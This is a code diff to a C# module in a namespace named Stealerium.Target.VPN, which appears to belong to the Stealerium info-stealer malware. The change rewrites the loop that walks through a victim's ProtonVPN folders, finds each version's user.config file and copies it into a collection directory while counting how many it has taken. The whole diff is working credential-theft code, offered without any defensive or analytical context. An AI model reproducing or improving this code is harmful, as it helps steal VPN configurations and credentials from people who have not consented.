@@ -21,26 +21,22 @@ namespace Stealerium.Target.VPN
                 // Iterate over all subdirectories in the ProtonVPN folder
                 foreach (var directory in Directory.GetDirectories(protonVpnPath))
                 {
-                    // Look for ProtonVPN executable directories
-                    if (directory.Contains("ProtonVPN.exe"))
+                    // Iterate over each version directory inside the ProtonVPN executable directory
+                    foreach (var versionDirectory in Directory.GetDirectories(directory))
                     {
-                        // Iterate over each version directory inside the ProtonVPN executable directory
-                        foreach (var versionDirectory in Directory.GetDirectories(directory))
+                        var userConfigPath = Path.Combine(versionDirectory, "user.config");
+                        if (!File.Exists(userConfigPath)) continue;
+
+                        // Define the destination directory to copy the configuration
+                        var destinationDir = Path.Combine(savePath, new DirectoryInfo(versionDirectory).Name);
+
+                        if (!Directory.Exists(destinationDir))
                         {
-                            var userConfigPath = Path.Combine(versionDirectory, "user.config");
-                            if (!File.Exists(userConfigPath)) continue;
+                            Counter.Vpn++;
+                            Directory.CreateDirectory(destinationDir);
 
-                            // Define the destination directory to copy the configuration
-                            var destinationDir = Path.Combine(savePath, new DirectoryInfo(versionDirectory).Name);
-
-                            if (!Directory.Exists(destinationDir))
-                            {
-                                Counter.Vpn++;
-                                Directory.CreateDirectory(destinationDir);
-
-                                // Copy the user.config file to the destination directory
-                                File.Copy(userConfigPath, Path.Combine(destinationDir, "user.config"));
-                            }
+                            // Copy the user.config file to the destination directory
+                            File.Copy(userConfigPath, Path.Combine(destinationDir, "user.config"));
                         }
                     }
                 }
